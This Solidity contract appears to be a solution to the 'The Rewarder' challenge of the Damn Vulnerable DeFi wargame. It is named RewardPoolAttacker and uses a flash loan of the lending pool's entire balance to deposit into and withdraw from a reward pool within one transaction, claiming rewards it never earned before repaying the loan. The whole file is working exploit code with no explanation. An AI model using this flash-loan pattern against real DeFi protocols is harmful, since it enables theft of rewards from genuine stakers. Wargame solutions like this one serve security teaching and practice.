// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewardPoolAttacker {
  FlashLoanerPool flashLoanerPool;
  TheRewarderPool theRewarderPool;
  DamnValuableToken damnValuableToken;
  RewardToken rewardToken;

  constructor(address _flashLoanerPool, address _theRewarderPool, address _damnValuableToken, address _rewardToken) {
    flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
    theRewarderPool = TheRewarderPool(_theRewarderPool);
    damnValuableToken = DamnValuableToken(_damnValuableToken);
    rewardToken = RewardToken(_rewardToken);
  }

  function attack() external {
    uint256 flashLoanAmount = damnValuableToken.balanceOf(address(flashLoanerPool));

    // Take out flash loan from FlashLoanerPool
    flashLoanerPool.flashLoan(flashLoanAmount);

    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
  }

  function receiveFlashLoan(uint256 amount) external {
    // Approve token transfer to reward pool
    damnValuableToken.approve(address(theRewarderPool), amount);

    // Deposit into TheRewarderPool
    theRewarderPool.deposit(amount);

    // Withdraw from TheRewarderPool
    theRewarderPool.withdraw(amount);

    // Transfer liquidity tokens back to pool
    damnValuableToken.transfer(msg.sender, amount);
  }
}